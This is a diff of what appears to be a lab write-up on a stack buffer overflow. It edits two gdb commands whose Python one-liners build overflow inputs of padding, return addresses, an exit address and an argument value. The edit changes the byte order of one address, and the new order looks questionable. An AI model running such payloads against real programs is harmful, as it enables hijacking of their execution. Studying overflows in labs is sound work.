@@ -148,7 +148,7 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 
 **Connect gdb and run by this command:**
 
-`r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'a'*4+'\x11\x12\x04\x08'+'\x62\x42\x64\x44')")`
+`r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'a'*4+'\x11\x12\x08\x04'+'\x62\x42\x64\x44')")`
 
 ![alt text](./image/image-34.png)
 
@@ -164,7 +164,7 @@ As we can see, the dummyfile is **start from** `0xffffd672` **not from** `0x0804
 --> So we obtain the address of the exit: `080483e0`
 
 **Connect gdb and run again by this command:**
-`r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'\xe0\x83\x08\x04'+'\x11\x12\x04\x08'+'\x62\x42\x64\x44')")`
+`r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'\xe0\x83\x08\x04'+'\x11\x12\x08\x04'+'\x62\x42\x64\x44')")`
 
 ![alt text](./image/image-36.png)
 
